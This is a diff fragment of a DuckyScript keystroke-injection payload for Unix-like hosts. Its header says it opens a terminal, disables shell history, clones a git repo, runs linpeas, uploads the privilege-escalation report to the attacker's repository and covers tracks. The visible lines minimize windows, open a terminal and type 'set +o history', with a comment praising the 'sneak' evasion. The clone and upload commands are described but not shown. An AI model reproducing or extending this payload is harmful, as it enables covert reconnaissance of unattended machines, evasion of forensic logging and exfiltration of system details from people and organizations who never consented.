@@ -4,7 +4,7 @@ REM Target:  Unix-like tested on kubuntu 22.04
 REM Props: Hak5, strippers and memes
 REM Version: 1.0
 REM Category: Recon
-REM Launches Covers tracks, clones git repo as most organizations allow github, launches linpeas and uploads the report to your git repo. Best viewing of report is to view it in the terminal.
+REM Launches terminal, turns off history, clones git repo as most organizations allow github, launches linpeas in background, uploads the report to your git repo and covers tracks. Best viewing of report is to view it in the terminal.
 REM
 REM initialization delay
 DELAY 300
@@ -12,7 +12,6 @@ REM Minimize all windows as that ensures launch happens smoother.
 WINDOWS d
 DELAY 300
 CTRL-ALT t
-REM adjust delay as needed
 DELAY 1500
 REM sneak +1 don't delete the whole history or mess with settings, just turn history off and delete the history command entry ;)
 STRING set +o history
